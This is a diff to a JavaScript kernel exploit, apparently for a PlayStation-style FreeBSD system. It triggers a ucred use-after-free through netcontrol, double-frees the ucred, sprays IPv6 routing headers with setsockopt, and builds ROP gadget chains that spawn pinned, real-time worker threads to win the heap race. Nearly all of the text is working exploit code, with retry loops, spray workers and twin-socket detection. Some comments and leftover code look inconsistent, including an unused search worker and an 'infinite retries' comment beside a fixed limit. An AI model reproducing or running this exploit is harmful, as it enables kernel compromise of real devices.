@@ -25,9 +25,10 @@ var MSG_IOV_NUM = 0x17
 var IPV6_SOCK_NUM = 128  // Matching Poops.java
 var RTHDR_TAG = 0x13370000
 
-// Retry parameters (matching Poops.java)
-var TWIN_TRIES = 15000  // Matching Poops.java
+// Retry parameters
+var TWIN_TRIES = 10
 var UAF_TRIES = 50000   // Matching Poops.java
+// Infinite retries - will loop until twins are found
 
 // NetControl constants
 var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
@@ -247,9 +248,13 @@ log('Prepared IOV spray structures')
 // ============================================================================
 
 var IOV_WORKER_NUM = 4  // Matching Poops.java IOV_THREAD_NUM
+var SPRAY_WORKER_NUM = 4  // Multiple spray workers to flood allocator from different CPUs
 var recvmsg_wrapper = syscalls.map.get(0x1B)
 var read_wrapper = syscalls.map.get(0x03)
 var write_wrapper = syscalls.map.get(0x04)
+var setsockopt_wrapper = syscalls.map.get(0x69)
+var getsockopt_wrapper = syscalls.map.get(0x76)  // getsockopt for twin detection
+var sched_yield_wrapper = syscalls.map.get(0x14B)
 var thr_exit_wrapper = syscalls.map.get(0x1AF)
 
 // Check if cpuset_setaffinity and rtprio_thread exist in syscalls.map
@@ -269,6 +274,13 @@ if (!syscalls.map.has(0x1D2)) {
 
 fn.register(0x1C7, 'thr_new', 'bigint')
 var thr_new = fn.thr_new
+
+// Store socket FDs in native memory for ROP access
+var ipv6_sockets_buf = mem.malloc(IPV6_SOCK_NUM * 4)  // 4 bytes per int32
+for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+  mem.view(ipv6_sockets_buf).setUint32(i * 4, ipv6_sockets[i], true)
+}
+log('IPv6 socket FDs stored at: ' + ipv6_sockets_buf.toString())
 
 // Worker pool - each worker has its own resources
 var workers = []
@@ -324,9 +336,259 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
   workers.push(worker)
 }
 
-log('Created ' + IOV_WORKER_NUM + ' worker slots')
+log('Created ' + IOV_WORKER_NUM + ' IOV worker slots')
 
-// Build ROP chain for a worker: infinite loop with stack pivoting
+// Twin search result buffer - worker writes twins here
+var twin_result_buf = mem.malloc(16)  // [found (4 bytes), twin0 (4 bytes), twin1 (4 bytes), padding]
+mem.view(twin_result_buf).setUint32(0, 0, true)  // found = 0
+mem.view(twin_result_buf).setUint32(4, 0xffffffff, true)  // twin0 = -1
+mem.view(twin_result_buf).setUint32(8, 0xffffffff, true)  // twin1 = -1
+
+// Twin search worker - pre-spawned, waits for signal, does spray-and-check in ROP
+var twin_worker = {}
+
+// Allocate twin worker resources
+var twin_ctrl_sp = mem.malloc(8)
+socketpair(1, 1, 0, twin_ctrl_sp)
+twin_worker.ctrl_sock0 = mem.view(twin_ctrl_sp).getUint32(0, true)
+twin_worker.ctrl_sock1 = mem.view(twin_ctrl_sp).getUint32(4, true)
+twin_worker.stack_size = 0x4000
+twin_worker.stack = mem.malloc(twin_worker.stack_size)
+twin_worker.tls = mem.malloc(0x40)
+twin_worker.child_tid = mem.malloc(8)
+twin_worker.parent_tid = mem.malloc(8)
+twin_worker.thr_param = mem.malloc(0x80)
+twin_worker.signal_buf = mem.malloc(1)
+twin_worker.rop_stack_size = 0x40000  // 256KB (10 passes × 128 sockets)
+twin_worker.rop_stack = mem.malloc(twin_worker.rop_stack_size)
+twin_worker.leak_buf = mem.malloc(UCRED_SIZE)
+twin_worker.leak_len_buf = mem.malloc(8)
+
+// CPU affinity - pin to CPU 5 for isolation
+twin_worker.cpumask = mem.malloc(0x10)
+mem.view(twin_worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
+mem.view(twin_worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
+mem.view(twin_worker.cpumask).setUint16(0, 1 << 5, true)
+
+// Realtime priority
+twin_worker.rtp = mem.malloc(4)
+mem.view(twin_worker.rtp).setUint16(0, 2, true)
+mem.view(twin_worker.rtp).setUint16(2, 768, true)  // Very high priority
+
+log('Twin search worker resources allocated')
+
+// Spray workers for rapid pktopts allocation AND twin detection
+var spray_workers = []
+for (var w = 0; w < SPRAY_WORKER_NUM; w++) {
+  var worker = {}
+
+  // Control socketpair for signaling this worker
+  var ctrl_sp_buf = mem.malloc(8)
+  socketpair(1, 1, 0, ctrl_sp_buf)
+  worker.ctrl_sock0 = mem.view(ctrl_sp_buf).getUint32(0, true)
+  worker.ctrl_sock1 = mem.view(ctrl_sp_buf).getUint32(4, true)
+
+  // Worker resources
+  worker.stack_size = 0x4000  // Larger stack for unrolled loop
+  worker.stack = mem.malloc(worker.stack_size)
+  worker.tls = mem.malloc(0x40)
+  worker.child_tid = mem.malloc(8)
+  worker.parent_tid = mem.malloc(8)
+  worker.thr_param = mem.malloc(0x80)
+  worker.signal_buf = mem.malloc(1)
+
+  // Buffers for getsockopt in ROP
+  worker.leak_buf = mem.malloc(UCRED_SIZE)
+  worker.leak_len_buf = mem.malloc(8)
+
+  // CPU affinity for this worker - spread across CPUs 1,2,3,5
+  worker.cpumask = mem.malloc(0x10)
+  mem.view(worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
+  mem.view(worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
+  var cpu_map = [1, 2, 3, 5]  // Avoid CPU 4 (main thread) and CPU 0 (system)
+  worker.cpu = cpu_map[w % cpu_map.length]
+  mem.view(worker.cpumask).setUint16(0, 1 << worker.cpu, true)
+
+  // Realtime priority
+  worker.rtp = mem.malloc(4)
+  mem.view(worker.rtp).setUint16(0, 2, true)    // RTP_PRIO_REALTIME
+  mem.view(worker.rtp).setUint16(2, 512, true)  // Higher priority 512
+
+  // Separate ROP stack
+  worker.rop_stack_size = 0x20000  // Much larger - full twin search in ROP!
+  worker.rop_stack = mem.malloc(worker.rop_stack_size)
+
+  spray_workers.push(worker)
+}
+
+log('Created ' + SPRAY_WORKER_NUM + ' spray worker slots')
+
+// Build ROP chain for twin search worker: spray and check in tight ROP loop
+function buildTwinSearchROP() {
+  var rop = []
+  var SEARCH_PASSES = 50  // Do 50 spray-and-check passes in pure ROP
+
+  // Pin to CPU 5
+  if (cpuset_setaffinity_wrapper !== null) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, 3))
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(0, 1))
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(new BigInt(0xffffffff, 0xffffffff))
+    rop.push(gadgets.POP_RCX_RET)
+    rop.push(new BigInt(0, 0x10))
+    rop.push(gadgets.POP_R8_RET)
+    rop.push(twin_worker.cpumask)
+    rop.push(cpuset_setaffinity_wrapper)
+  }
+
+  // Set realtime priority
+  if (rtprio_thread_wrapper !== null) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, 1))
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(0, 0))
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(twin_worker.rtp)
+    rop.push(rtprio_thread_wrapper)
+  }
+
+  // Wait for signal to start
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(twin_worker.ctrl_sock0))
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(twin_worker.signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(0, 1))
+  rop.push(read_wrapper)
+
+  // Allocate buffer array for all socket data (128 sockets × 8 bytes each)
+  var socket_data_array = mem.malloc(IPV6_SOCK_NUM * 8)
+  var check_len = mem.malloc(4)
+
+  // Initialize check_len to 8 bytes (done in JavaScript before ROP runs)
+  mem.view(check_len).setUint32(0, 8, true)
+
+  // Do spray passes - many passes for better race chance
+  var ROP_SPRAY_PASSES = 10  // Reduced to prevent kernel panic
+  for (var pass = 0; pass < ROP_SPRAY_PASSES; pass++) {
+    // Spray all 128 sockets
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      rop.push(gadgets.POP_RDI_RET)
+      rop.push(new BigInt(0, ipv6_sockets[i]))
+      rop.push(gadgets.POP_RSI_RET)
+      rop.push(new BigInt(0, IPPROTO_IPV6))
+      rop.push(gadgets.POP_RDX_RET)
+      rop.push(new BigInt(0, IPV6_RTHDR))
+      rop.push(gadgets.POP_RCX_RET)
+      rop.push(rthdr_buf)
+      rop.push(gadgets.POP_R8_RET)
+      rop.push(new BigInt(0, rthdr_size))
+      rop.push(setsockopt_wrapper)
+    }
+  }
+
+  // After spraying, read all sockets into buffer array
+  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, ipv6_sockets[i]))
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(0, IPPROTO_IPV6))
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(new BigInt(0, IPV6_RTHDR))
+    rop.push(gadgets.POP_RCX_RET)
+    rop.push(socket_data_array.add(new BigInt(0, i * 8)))  // Offset for socket i
+    rop.push(gadgets.POP_R8_RET)
+    rop.push(check_len)
+    rop.push(getsockopt_wrapper)
+  }
+
+  // Signal completion
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(twin_worker.ctrl_sock1))
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(twin_worker.signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(0, 1))
+  rop.push(write_wrapper)
+
+  // Exit
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(0, 0))
+  rop.push(thr_exit_wrapper)
+
+  // Return both ROP chain and socket data buffer
+  return {
+    rop: rop,
+    socket_data_array: socket_data_array
+  }
+}
+
+// Build ROP chain for spray worker: MULTIPLE rapid spray passes
+// With 4 workers, each doing 5 passes = 20 total passes across system
+function buildSprayWorkerROP(worker) {
+  var rop = []
+  var SPRAY_PASSES = 5  // 5 passes per worker × 4 workers = 20 total passes
+
+  // Pin to assigned CPU: cpuset_setaffinity(3, 1, -1, 0x10, worker.cpumask) - if available
+  if (cpuset_setaffinity_wrapper !== null) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, 3))  // CPU_LEVEL_WHICH
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(0, 1))  // CPU_WHICH_TID
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(new BigInt(0xffffffff, 0xffffffff))  // id = -1
+    rop.push(gadgets.POP_RCX_RET)
+    rop.push(new BigInt(0, 0x10))  // setsize
+    rop.push(gadgets.POP_R8_RET)
+    rop.push(worker.cpumask)
+    rop.push(cpuset_setaffinity_wrapper)
+  }
+
+  // Set realtime priority: rtprio_thread(1, 0, worker.rtp) - if available
+  if (rtprio_thread_wrapper !== null) {
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(new BigInt(0, 1))  // RTP_SET
+    rop.push(gadgets.POP_RSI_RET)
+    rop.push(new BigInt(0, 0))  // lwpid = 0
+    rop.push(gadgets.POP_RDX_RET)
+    rop.push(worker.rtp)
+    rop.push(rtprio_thread_wrapper)
+  }
+
+  // Do multiple spray passes - unrolled for MAXIMUM SPEED
+  for (var pass = 0; pass < SPRAY_PASSES; pass++) {
+    // Each pass sprays all 128 sockets
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      var sock_fd = ipv6_sockets[i]
+      rop.push(gadgets.POP_RDI_RET)
+      rop.push(new BigInt(0, sock_fd))  // socket FD
+      rop.push(gadgets.POP_RSI_RET)
+      rop.push(new BigInt(0, IPPROTO_IPV6))  // level = 41
+      rop.push(gadgets.POP_RDX_RET)
+      rop.push(new BigInt(0, IPV6_RTHDR))  // optname = 51
+      rop.push(gadgets.POP_RCX_RET)
+      rop.push(rthdr_buf)  // optval
+      rop.push(gadgets.POP_R8_RET)
+      rop.push(new BigInt(0, rthdr_size))  // optlen
+      rop.push(setsockopt_wrapper)
+    }
+    // Small yield between passes to let kernel process
+    if (pass < SPRAY_PASSES - 1) {
+      rop.push(sched_yield_wrapper)
+    }
+  }
+
+  // Exit thread cleanly: thr_exit(0)
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(0, 0))  // exit status
+  rop.push(thr_exit_wrapper)
+
+  return rop
+}
+
+// Build ROP chain for IOV worker: infinite loop with stack pivoting
 // Each worker has its own ROP stack that gets restored after each iteration
 function buildWorkerROP(worker) {
   var rop = []
@@ -437,15 +699,96 @@ function spawnWorker(worker_idx) {
   return thr_new(worker.thr_param, new BigInt(0, 0x68))
 }
 
-// Spawn all workers ONCE - they loop infinitely via stack pivoting
-log('Spawning ' + IOV_WORKER_NUM + ' looping workers (stack pivoting)...')
+// Spawn spray worker (only called once - worker loops via stack pivoting)
+function spawnSprayWorker(worker_idx) {
+  var worker = spray_workers[worker_idx]
+
+  // Reset TID values
+  mem.view(worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
+  mem.view(worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)
+
+  // Build and write ROP chain to dedicated ROP stack
+  var rop = buildSprayWorkerROP(worker)
+  log('  Spray worker ROP chain size: ' + rop.length + ' gadgets (' + (rop.length * 8) + ' bytes)')
+
+  if (rop.length * 8 > worker.rop_stack_size) {
+    throw new Error('Spray worker ROP chain too large! ' + (rop.length * 8) + ' > ' + worker.rop_stack_size)
+  }
+
+  var rop_stack_top = worker.rop_stack.add(new BigInt(0, worker.rop_stack_size))
+  for (var i = rop.length - 1; i >= 0; i--) {
+    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
+    mem.view(rop_stack_top).setBigInt(0, rop[i], true)
+  }
+
+  // Write pivot target to thread's initial stack
+  var initial_stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
+  var pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
+  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)  // Value for POP_RSP_RET
+
+  // Setup thr_param
+  mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)  // Entry: pop RSP (pivots to ROP stack)
+  mem.view(worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
+  mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
+  mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
+  mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
+  mem.view(worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
+  mem.view(worker.thr_param).setBigInt(0x30, worker.child_tid, true)
+  mem.view(worker.thr_param).setBigInt(0x38, worker.parent_tid, true)
+
+  return thr_new(worker.thr_param, new BigInt(0, 0x68))
+}
+
+// Spawn all IOV workers ONCE - they loop infinitely via stack pivoting
+log('Spawning ' + IOV_WORKER_NUM + ' looping IOV workers (stack pivoting)...')
 for (var w = 0; w < IOV_WORKER_NUM; w++) {
   var ret = spawnWorker(w)
   if (!ret.eq(0)) {
-    throw new Error('Failed to spawn worker ' + w + ': ' + ret.toString())
+    throw new Error('Failed to spawn IOV worker ' + w + ': ' + ret.toString())
   }
 }
-log('All workers spawned - they will loop infinitely without respawn!')
+log('All IOV workers spawned - they will loop infinitely without respawn!')
+log('Spray workers will be spawned on-demand (one-shot execution)')
+
+// Spawn twin search worker - it blocks waiting for signal
+log('Spawning twin search worker (will block until signaled)...')
+function spawnTwinSearchWorker() {
+  mem.view(twin_worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
+  mem.view(twin_worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)
+
+  var result = buildTwinSearchROP()
+  var rop = result.rop
+  twin_worker.socket_data_array = result.socket_data_array  // Store for later JavaScript access
+
+  log('  Twin search ROP chain: ' + rop.length + ' gadgets (' + (rop.length * 8) + ' bytes)')
+
+  if (rop.length * 8 > twin_worker.rop_stack_size) {
+    throw new Error('Twin search ROP too large!')
+  }
+
+  var rop_stack_top = twin_worker.rop_stack.add(new BigInt(0, twin_worker.rop_stack_size))
+  for (var i = rop.length - 1; i >= 0; i--) {
+    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
+    mem.view(rop_stack_top).setBigInt(0, rop[i], true)
+  }
+
+  var initial_stack_top = twin_worker.stack.add(new BigInt(0, twin_worker.stack_size))
+  var pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
+  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)
+
+  mem.view(twin_worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)
+  mem.view(twin_worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
+  mem.view(twin_worker.thr_param).setBigInt(0x10, twin_worker.stack, true)
+  mem.view(twin_worker.thr_param).setBigInt(0x18, new BigInt(0, twin_worker.stack_size), true)
+  mem.view(twin_worker.thr_param).setBigInt(0x20, twin_worker.tls, true)
+  mem.view(twin_worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
+  mem.view(twin_worker.thr_param).setBigInt(0x30, twin_worker.child_tid, true)
+  mem.view(twin_worker.thr_param).setBigInt(0x38, twin_worker.parent_tid, true)
+
+  return thr_new(twin_worker.thr_param, new BigInt(0, 0x68))
+}
+
+// twin search is done in main thread now, no seperate worker needed
 
 // Pin main thread to CPU core 4 and set real-time priority
 log('Pinning main thread to CPU 4 with real-time priority...')
@@ -474,21 +817,35 @@ rtprio_thread(RTP_SET, 0, main_rtp)
 
 log('Main thread pinned to CPU 4 and set to real-time priority')
 
-// IOV spray using single worker (matching Poops.java for precise stages)
-// Worker 0 only - used for double-free and triple-free setup
+// Fast ROP pktopts spray - spawns ALL spray workers simultaneously
+// Each does 10 passes of 128 setsockopt calls = massive memory pressure!
+function doFastPkoptsSpray() {
+  // Spawn all spray workers in parallel
+  for (var w = 0; w < SPRAY_WORKER_NUM; w++) {
+    var ret = spawnSprayWorker(w)
+    if (!ret.eq(0)) {
+      throw new Error('Failed to spawn spray worker ' + w + ': ' + ret.toString())
+    }
+  }
+  // Small yield to let workers execute in parallel on different CPUs
+  sched_yield()
+  sched_yield()  // Extra yield to ensure they finish
+}
+
+// iov spray with worker 0 only for double/triple-free
 function doIOVSpraySingle() {
-  // Signal worker 0 to start (matching Java: iovState.signalWork(0))
+  // signal worker to start spray
   write_sys(new BigInt(workers[0].ctrl_sock1), workers[0].signal_buf, new BigInt(0, 1))
   sched_yield()
 
-  // Write ONE byte to iov_ss1 - wakes worker 0
+  // wake worker with iov socketpair
   write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
 
-  // Wait for worker 0 to signal completion (matching Java: iovState.waitForFinished())
+  // wait for completion
   var done = read_sys(new BigInt(workers[0].ctrl_sock0), workers[0].signal_buf, new BigInt(0, 1))
   var done_val = (done instanceof BigInt) ? done.lo : done
   if (done_val !== 1) {
-    throw new Error('Worker 0 did not signal completion! read returned: ' + done_val)
+    throw new Error('worker didnt signal completion')
   }
 
   // Read ONE byte back from iov_ss0 (matching Java: read(iovSs0, tmp, Int8.SIZE))
@@ -534,232 +891,277 @@ function doIOVSpray() {
 }
 
 // ============================================================================
-// Trigger ucred UAF setup
+// Trigger ucred UAF setup with restart on twin failure
 // ============================================================================
 
-// Create dummy socket to register and close
-var dummy_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
-var dummy_sock = ((dummy_sock_result instanceof BigInt) ? dummy_sock_result.lo : dummy_sock_result) & 0xFFFFFFFF
-log('Created dummy socket: ' + dummy_sock)
-
-// Register dummy socket with netcontrol
-set_buf = mem.malloc(8)
-mem.view(set_buf).setUint32(0, dummy_sock, true)
-var set_ret = netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE), set_buf, new BigInt(0, 8))
-log('netcontrol SET_QUEUE returned: ' + ((set_ret instanceof BigInt) ? set_ret.toString() : set_ret))
-
-// Close dummy socket
-close_sys(dummy_sock)
-log('Closed dummy socket')
-
-// Allocate new ucred
-setuid_sys(1)
-
-// Reclaim the file descriptor
-var uaf_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
-uaf_sock = ((uaf_sock_result instanceof BigInt) ? uaf_sock_result.lo : uaf_sock_result) & 0xFFFFFFFF
-log('Created uaf_sock: ' + uaf_sock)
-
-// Free the previous ucred (now uaf_sock's f_cred has cr_refcnt=1)
-setuid_sys(1)
-
-// Unregister and free the file and ucred
-clear_buf = mem.malloc(8)
-mem.view(clear_buf).setUint32(0, uaf_sock, true)
-var clear_ret = netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE), clear_buf, new BigInt(0, 8))
-log('netcontrol CLEAR_QUEUE returned: ' + ((clear_ret instanceof BigInt) ? clear_ret.toString() : clear_ret))
-
-// Set cr_refcnt back to 1 with IOV spray (32 iterations matching Poops.java lines 823-829)
-log('Resetting cr_refcnt with IOV spray (32 iterations, worker 0 only)...')
-for (var reset_i = 0; reset_i < 32; reset_i++) {
-  doIOVSpraySingle()  // Match Java: only worker 0
-}
-
-// Double free ucred (only dup works - doesn't check f_hold)
-// Matching Java: no wait between IOV spray and double-free
-var dup_fd = dup_sys(uaf_sock)
-var dup_fd_num = (dup_fd instanceof BigInt) ? dup_fd.lo : dup_fd
-log('dup_sys returned: ' + dup_fd_num + ' (should be >= 0)')
-if (dup_fd_num < 0) {
-  throw new Error('dup_sys failed with: ' + dup_fd_num)
-}
-close_sys(dup_fd_num)
-log('Double freed ucred via close(dup(' + uaf_sock + ')) where dup_fd=' + dup_fd_num)
-
-
-// Find twin sockets (two sockets sharing the same kernel rthdr)
-log('Finding twins...')
-
+var exploit_restart_count = 0
 var found_twins = false
 
-// Set leak_len_buf once outside loop to reduce memory allocations
-mem.view(leak_len_buf).setUint32(0, 8, true)
-
-// Reuse single view to avoid creating new DataViews
-var rthdr_view = mem.view(rthdr_buf)
-var leak_view = mem.view(leak_rthdr_buf)
-
-for (var twin_attempts = 0; twin_attempts < TWIN_TRIES; twin_attempts++) {
-  // Yield every 10 attempts to prevent memory buildup
-  if (twin_attempts > 0 && twin_attempts % 10 === 0) {
+while (!found_twins) {
+  if (exploit_restart_count > 0) {
+    log('retry attempt ' + (exploit_restart_count + 1))
     sched_yield()
   }
 
-  // Progress logging every 100 attempts
-  if (twin_attempts > 0 && twin_attempts % 100 === 0) {
-    log('  Twin search progress: ' + twin_attempts + '/' + TWIN_TRIES + ' attempts...')
+  exploit_restart_count++
 
-    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory) {
-      log('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc)
-    }
+  // trigger triple-free
+  var dummy_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
+  var dummy_sock = ((dummy_sock_result instanceof BigInt) ? dummy_sock_result.lo : dummy_sock_result) & 0xFFFFFFFF
+
+  mem.view(set_buf).setUint32(0, dummy_sock, true)
+  netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE), set_buf, new BigInt(0, 8))
+  close_sys(dummy_sock)
+
+  setuid_sys(1)
+
+  var uaf_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
+  uaf_sock = ((uaf_sock_result instanceof BigInt) ? uaf_sock_result.lo : uaf_sock_result) & 0xFFFFFFFF
+  log('uaf socket: ' + uaf_sock)
+
+  setuid_sys(1)
+
+  mem.view(clear_buf).setUint32(0, uaf_sock, true)
+  netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE), clear_buf, new BigInt(0, 8))
+
+  // reset refcount with iov spray
+  log('reseting cr_refcnt...')
+  for (var reset_i = 0; reset_i < 32; reset_i++) {
+    doIOVSpraySingle()
   }
 
-  // Combined spray and check loop to reduce iterations and memory
-  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-    // Spray tag to this socket
-    rthdr_view.setUint32(4, RTHDR_TAG | i, true)
-    setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
+  // double free the ucred
+  log('triggering double-free...')
+  var dup_fd = dup_sys(uaf_sock)
+  var dup_fd_num = (dup_fd instanceof BigInt) ? dup_fd.lo : dup_fd
+  if (dup_fd_num < 0) {
+    log('dup failed, cant double-free')
+    throw new Error('dup_sys failed with: ' + dup_fd_num)
   }
+  close_sys(dup_fd_num)
+  log('ucred double-freed, searching for twins...')
 
-  // Check all sockets for twins
-  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-    getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+  // Simple spray and check loop, no ROP needed
+  var check_len_buf = mem.malloc(4)
+  var leak_buf = mem.malloc(8)
 
-    var val = leak_view.getUint32(4, true)
-    var j = val & 0xFFFF
-
-    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j < IPV6_SOCK_NUM) {
-      twins[0] = i
-      twins[1] = j
-      found_twins = true
-      log('Found twins: socket[' + i + '] and socket[' + j + '] share rthdr (attempt ' + (twin_attempts + 1) + ')')
-      break
-    }
-  }
-
-  if (found_twins) break
-}
-
-if (!found_twins) {
-  throw new Error('Failed to find twins after ' + TWIN_TRIES + ' attempts')
-}
-
-log('=== SUCCESS: Twins found! Stopping here for testing ===')
-log('Twin sockets: [' + twins[0] + ', ' + twins[1] + ']')
-utils.notify('NetControl: Twins found!')
-throw new Error('STOP: Twins found - halting before triple-free')
-
-// ============================================================================
-// Triple-free setup
-// ============================================================================
-log('=== Triple-freeing ucred ===')
-
-// Free one twin's rthdr
-setsockopt(ipv6_sockets[twins[1]], IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
-log('Freed rthdr on socket[' + twins[1] + ']')
-
-// Set cr_refcnt back to 1 by spraying IOV until first_int == 1 (matching Java lines 837-853)
-log('Spraying IOV to reset cr_refcnt for triple-free...')
-var uaf_timeout = UAF_TRIES
-while (uaf_timeout-- > 0) {
-  // Signal worker 0 to start (matching Java: iovState.signalWork(0))
-  write_sys(new BigInt(workers[0].ctrl_sock1), workers[0].signal_buf, new BigInt(0, 1))
-  sched_yield()
-
-  // Check if reclaim succeeded (matching Java: leakRthdr.getInt(0x00) == 1)
-  mem.view(leak_len_buf).setUint32(0, 8, true)
-  getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
-
-  if (mem.view(leak_rthdr_buf).getUint32(0, true) === 1) {
-    log('IOV reclaim successful (first_int = 1) after ' + (UAF_TRIES - uaf_timeout) + ' attempts')
-    break
-  }
-
-  // Complete IOV spray (matching Java: write → waitForFinished → read)
-  write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
-  read_sys(new BigInt(workers[0].ctrl_sock0), workers[0].signal_buf, new BigInt(0, 1))
-  read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
-  // Worker auto-loops via stack pivoting - no respawn needed
-}
-
-if (uaf_timeout <= 0) {
-  throw new Error('IOV reclaim failed after ' + UAF_TRIES + ' attempts')
-}
-
-var triplets = [-1, -1, -1]
-triplets[0] = twins[0]
-
-// Triple free ucred (second time)
-var dup_fd2 = dup_sys(uaf_sock)
-close_sys(dup_fd2)
-log('Triple-freed ucred via close(dup(uaf_sock))')
-
-// Helper function to find triplet
-function findTriplet (master, other) {
-  var max_attempts = 50000
-  var attempt = 0
-
-  while (attempt < max_attempts) {
-    // Spray rthdr on all sockets except master and other
-    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-      if (i === master || i === other) {
-        continue
-      }
-      mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
-      setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
-    }
-
-    // Check for triplet by reading from master
-    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-      if (i === master || i === other) {
-        continue
+  try {
+    for (var attempt = 0; attempt < TWIN_TRIES; attempt++) {
+      // tag and spray all sockets
+      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+        mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
+        setsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
       }
 
-      mem.view(leak_len_buf).setUint32(0, UCRED_SIZE, true)
-      getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
+      sched_yield()
 
-      var val = mem.view(leak_rthdr_buf).getUint32(4, true)
-      var j = val & 0xFFFF
+      // check for shared pktopts
+      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+        mem.view(check_len_buf).setUint32(0, 8, true)
+        getsockopt(ipv6_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, leak_buf, check_len_buf)
+        var val = mem.view(leak_buf).getUint32(4, true)
+        var j = val & 0xFFFF
 
-      if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
-        return j
+        if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j < IPV6_SOCK_NUM) {
+          twins[0] = i
+          twins[1] = j
+          found_twins = true
+          log('twins found: sockets ' + i + ' and ' + j)
+          break
+        }
+      }
+
+      if (found_twins) {
+        break
+      }
+
+      if (attempt < TWIN_TRIES - 1) {
+        sched_yield()
       }
     }
-
-    attempt++
+  } catch (e) {
+    log('twin search crashed: ' + e.message)
+    // will cleanup and retry
   }
 
-  return -1
-}
+  // cleanup temp buffers
+  if (typeof check_len_buf !== 'undefined') {
+    try { mem.free(check_len_buf) } catch(e) {}
+  }
+  if (typeof leak_buf !== 'undefined') {
+    try { mem.free(leak_buf) } catch(e) {}
+  }
 
